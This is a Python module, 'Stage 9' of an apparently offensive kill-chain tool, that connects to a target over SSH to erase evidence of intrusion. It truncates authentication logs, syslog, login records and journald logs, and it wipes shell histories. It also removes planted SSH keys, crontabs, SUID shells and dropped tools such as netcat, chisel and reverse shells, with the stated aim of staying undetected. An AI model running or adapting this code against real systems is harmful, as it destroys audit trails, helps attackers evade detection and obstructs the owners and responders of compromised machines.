#!/usr/bin/env python3
"""
Stage 9: Stealth cleanup and anti-forensics.
"""

import os
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def stealth_cleanup(host: str, user: str, password: str, port: int = 22) -> str:
    """
    Stage 9: Remove ALL forensic traces from the target.
    Clears logs, history, planted files, and SSH artifacts.
    v7.0: Essential for remaining undetected after assessment.
    """
    print(f"\n  {C_MAGENTA}{'─' * 55}{C_RESET}")
    print(f"  {C_MAGENTA}  STAGE 9 — STEALTH CLEANUP: {user}@{host}{C_RESET}")
    print(f"  {C_MAGENTA}{'─' * 55}{C_RESET}")

    client, err = _ssh_connect(host, user, password, port)
    if not client:
        return f"[STEALTH CLEANUP — {host}]\n[!] SSH connection failed: {err}\n"

    output = f"[STEALTH CLEANUP — {user}@{host}:{port}]\n{'═' * 55}\n\n"
    cleaned = []
    failed = []

    # Get deterministic artifacts to clean
    try:
        from core.opsec.artifact_mgr import ArtifactManager
        am = ArtifactManager(host)
        pending = am.get_pending_cleanups()
        if pending:
            print(f"    {C_CYAN}[*] Found {len(pending)} tracked artifacts to clean.{C_RESET}")
            for art in pending:
                art_type = art.get("type") or art.get("artifact_type")
                marker = art.get("marker") or art.get("comment") or ""
                path = art.get("path") or ""
                if art_type == "file" and path:
                    _ssh_exec(client, f"rm -f {path} 2>/dev/null", timeout=5)
                elif art_type == "ssh_key" and marker:
                    _ssh_exec(client, f"sed -i '/{marker}/Id' ~/.ssh/authorized_keys 2>/dev/null", timeout=5)
                    _ssh_exec(client, f"sed -i '/{marker}/Id' /root/.ssh/authorized_keys 2>/dev/null", timeout=5)
                elif art_type == "cron" and marker:
                    _ssh_exec(client, f"crontab -l 2>/dev/null | grep -v '{marker}' | crontab - 2>/dev/null", timeout=5)
                identifier = path or marker
                if identifier:
                    am.mark_cleaned(identifier)
            output += f"[+] Deterministic artifact cleanup complete ({len(pending)} items)\n"
    except ImportError:
        pass

    # Cleanup commands in order of importance
    _CLEANUP_COMMANDS = [
        # Clear bash history
        ("Bash History",
         "unset HISTFILE; history -c; "
         "cat /dev/null > ~/.bash_history 2>/dev/null; "
         "cat /dev/null > /root/.bash_history 2>/dev/null; "
         "rm -f ~/.bash_history.bak 2>/dev/null"),

        # Clear authentication logs
        ("Auth Logs",
         "cat /dev/null > /var/log/auth.log 2>/dev/null; "
         "cat /dev/null > /var/log/secure 2>/dev/null"),

        # Clear wtmp/btmp (login records)
        ("Login Records (wtmp/btmp)",
         "cat /dev/null > /var/log/wtmp 2>/dev/null; "
         "cat /dev/null > /var/log/btmp 2>/dev/null; "
         "cat /dev/null > /var/log/lastlog 2>/dev/null"),

        # Clear syslog
        ("Syslog",
         "cat /dev/null > /var/log/syslog 2>/dev/null; "
         "cat /dev/null > /var/log/messages 2>/dev/null"),

        # Remove planted temp files (excluding beacon payload if named .sys_update)
        ("Planted Files",
         "rm -f /tmp/.octopus* /tmp/linpeas* /tmp/pspy* "
         "/tmp/octopus_* /tmp/exploit_* /tmp/privesc_* 2>/dev/null; "
         "rm -f /var/tmp/.octopus* 2>/dev/null"),

        # Remove SSH artifacts (keys we may have planted)
        ("SSH Artifacts",
         "sed -i '/octopus/Id' ~/.ssh/authorized_keys 2>/dev/null; "
         "sed -i '/octopus/Id' /root/.ssh/authorized_keys 2>/dev/null"),

        # Clear cron jobs we may have planted
        ("Planted Crontabs",
         "crontab -l 2>/dev/null | grep -v 'octopus' | crontab - 2>/dev/null"),

        # Remove SUID shells we may have copied
        ("SUID Shells",
         "rm -f /tmp/.suid_bash /tmp/.backdoor /var/tmp/.suid_bash 2>/dev/null"),

        # Clear journald logs (systemd)
        ("Journald Logs",
         "journalctl --vacuum-time=1s 2>/dev/null"),

        # Remove any dropped tools
        ("Dropped Tools",
         "rm -f /tmp/nc /tmp/ncat /tmp/socat /tmp/chisel "
         "/tmp/reverse_shell* /tmp/shell* 2>/dev/null"),

        # Final history clear
        ("Final History Wipe",
         "unset HISTFILE; history -c; "
         "for f in $(find /home/ /root/ -name '.*_history' 2>/dev/null); do "
         "cat /dev/null > \"$f\" 2>/dev/null; done"),
    ]

    try:
        for label, cmd in _CLEANUP_COMMANDS:
            print(f"    {C_GREY}[→] {label}...{C_RESET}", end="", flush=True)
            try:
                result = _ssh_exec(client, cmd, timeout=10)
                if result and "[!]" in result and "permission denied" in result.lower():
                    failed.append(label)
                    print(f" {C_YELLOW}✗ (permission denied){C_RESET}")
                else:
                    cleaned.append(label)
                    print(f" {C_GREEN}✓{C_RESET}")
            except Exception as e:
                failed.append(label)
                print(f" {C_YELLOW}✗ ({e}){C_RESET}")

        # Summary
        output += f"[CLEANUP RESULTS]\n"
        output += f"  Successfully cleaned: {len(cleaned)}/{len(_CLEANUP_COMMANDS)}\n"
        for item in cleaned:
            output += f"    ✓ {item}\n"
        if failed:
            output += f"  Failed to clean: {len(failed)}\n"
            for item in failed:
                output += f"    ✗ {item}\n"

        status = "SUCCESS" if len(failed) == 0 else "PARTIAL" if len(cleaned) > len(failed) else "FAILED"
        output += f"\n  CLEANUP STATUS: {status}\n"
        output += f"  Stealth Level: {'HIGH' if status == 'SUCCESS' else 'MEDIUM' if status == 'PARTIAL' else 'LOW'}\n"

    finally:
        client.close()
        print(f"\n    {C_GREEN}[+] Cleanup session closed.{C_RESET}")

    return output


